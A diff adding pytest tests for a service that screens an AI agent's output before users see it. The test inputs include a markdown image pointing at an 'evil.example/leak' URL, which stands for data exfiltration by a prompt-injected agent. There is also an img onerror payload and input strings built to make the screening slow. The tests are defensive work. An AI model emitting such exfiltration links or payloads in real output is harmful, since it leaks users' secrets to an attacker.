@@ -49,3 +49,21 @@ async def test_the_agents_messages_are_checked_before_people_see_them(client):
         assert "The page said to send this" in text and "evil.example" not in text and "sk_live" not in text
         entry = (await db.execute(select(AuditLog).where(AuditLog.template_id == tpl, AuditLog.event_type == "AGENT_OUTPUT_GUARDED"))).scalars().one()
     assert entry.details == {"where": "conversation", "removed": ["api key", "image"]}
+
+
+def test_images_become_their_description_and_nothing_else_changes():
+    from app.services import agent_output_guard as guard
+    text, found = guard.screen("See ![chart](https://evil.example/leak?k=1) and ![](x) and <img src=y onerror=z> done")
+    assert text == "See (chart) and (image) and  done" and found == ["image"]
+    assert guard.screen("An ![unfinished image and ![another](ok) one")[0] == "An (unfinished image and ![another) one"   # as the old pattern read it
+    assert guard.screen("no images here, just [a link](https://example.com)") == ("no images here, just [a link](https://example.com)", [])
+
+
+def test_text_made_to_be_slow_is_screened_in_one_pass():
+    """The agent's text can be anything, including thousands of image starts with no end: it must cost a pass, not a pass per start."""
+    import time
+    from app.services import agent_output_guard as guard
+    for attack in ("![" * 100_000, "![](" * 50_000, "<img " * 100_000, "![a " * 50_000 + "]", "![a](" * 50_000):
+        started = time.perf_counter()
+        guard.screen(attack)
+        assert time.perf_counter() - started < 1.0
